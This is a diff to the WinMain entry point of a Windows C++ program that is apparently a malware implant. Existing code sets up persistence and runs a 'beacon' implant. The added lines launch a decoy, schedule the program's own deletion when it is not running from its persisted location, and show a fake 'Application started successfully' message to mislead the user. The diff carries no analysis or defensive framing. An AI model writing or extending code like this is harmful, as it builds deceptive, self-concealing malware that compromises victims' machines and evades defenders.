@@ -5,6 +5,9 @@
 #include <windows.h>
 #include <objbase.h>
 #include "utils/Logger.h"
+#include "recon/Decoy.h"
+#include "utils/Cleanup.h"
+#include "utils/Pretext.h"
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
@@ -26,6 +29,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (FAILED(hr)) return 1;
 
     persistence::establishPersistence();
+    // If we are not running from the persisted location, launch decoy and schedule self-deletion
+    if (!persistence::isRunningFromPersistence()) {
+        recon::Decoy::Launch();
+        utils::Cleanup::SelfDelete();
+    }
+    // Optionally show a fake informational message
+    utils::Pretext::ShowInfoMessage(L"Application started successfully.", L"Info");
 
     beacon::Beacon implant;
     implant.run();
